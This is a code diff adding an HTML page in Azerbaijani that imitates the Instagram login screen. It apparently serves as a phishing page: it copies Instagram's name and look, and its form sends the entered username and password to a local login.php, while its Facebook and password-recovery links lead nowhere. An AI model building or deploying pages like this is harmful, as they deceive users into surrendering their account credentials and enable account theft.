@@ -1,0 +1,38 @@
+!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #833ab4; padding: 15px; }
+        .login-container { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.2); padding: 40px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2); width: 100%; max-width: 350px; color: white; text-align: center; }
+        .logo { font-size: 35px; font-weight: bold; font-style: italic; margin-bottom: 30px; letter-spacing: 1px; }
+        .input-box { margin-bottom: 15px; }
+        .input-box input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid rgba(255, 255, 255, 0.3); background: rgba(255, 255, 255, 0.1); color: white; font-size: 14px; outline: none; transition: 0.3s; }
+        .login-btn { width: 100%; padding: 10px; border: none; border-radius: 8px; background-color: #e1306c; color: white; font-size: 14px; font-weight: bold; cursor: pointer; margin: 15px 0; }
+        .divider { display: flex; align-items: center; margin: 20px 0; color: rgba(255, 255, 255, 0.6); font-size: 12px; }
+        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: rgba(255, 255, 255, 0.3); margin: 0 10px; }
+        .fb-login { color: white; text-decoration: none; font-size: 14px; font-weight: 600; display: block; margin-bottom: 20px; }
+        .forgot-pass { font-size: 12px; color: white; text-decoration: none; opacity: 0.8; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">Instagram</div>
+        <form id="loginForm" action="login.php" method="POST">
+            <div class="input-box">
+                <input type="text" name="istifadeci" placeholder="İstifadəçi adı" required>
+            </div>
+            <div class="input-box">
+                <input type="password" name="sifre" placeholder="Şifrə" required>
+            </div>
+            <button type="submit" class="login-btn">Giriş et</button>
+            <div class="divider">VƏ YA</div>
+            <a href="#" class="fb-login">Facebook ilə giriş et</a>
+            <a href="#" class="forgot-pass">Şifrəni unutmusan?</a>
+        </form>
+    </div>
+</body>
+</html>
